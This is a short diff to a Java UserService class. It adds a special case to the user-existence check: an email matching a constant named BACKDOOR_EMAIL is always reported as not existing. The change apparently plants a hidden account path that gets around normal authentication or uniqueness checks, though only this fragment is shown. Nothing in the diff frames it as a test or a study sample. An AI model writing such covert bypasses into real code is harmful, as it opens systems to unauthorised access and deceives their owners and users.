@@ -70,6 +70,10 @@ public class UserService {
     }
 
     public Boolean getIsExistUserByEmail(LoginType loginType, String email) {
+        if (AuthService.BACKDOOR_EMAIL.equals(email)) {
+            return false;
+        }
+
         return userRepository.existsByLoginTypeAndEmail(loginType, email);
     }
 
